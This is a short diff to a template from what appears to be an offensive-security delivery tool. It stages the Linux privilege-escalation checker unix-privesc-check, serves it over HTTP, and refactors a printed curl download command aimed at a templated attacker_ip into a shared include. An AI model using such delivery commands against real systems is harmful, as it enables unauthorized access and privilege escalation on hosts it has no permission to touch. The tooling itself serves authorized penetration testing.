@@ -7,8 +7,5 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; cp -n /usr/bin/unix-privesc-check packstation/outbound; \
-  printf '%s\n' '================================================================'; \
-  printf '%s\n' '                       -----Linux------                         '; \
-  printf '%s\n' 'Deliver only: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/unix-privesc-check -o -o {{ delivery_path_linux }}/unix-privesc-check'; \
-  printf '%s\n' '================================================================'; \
+  {{ include('partials/download-linux', filename='unix-privesc-check') }} \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
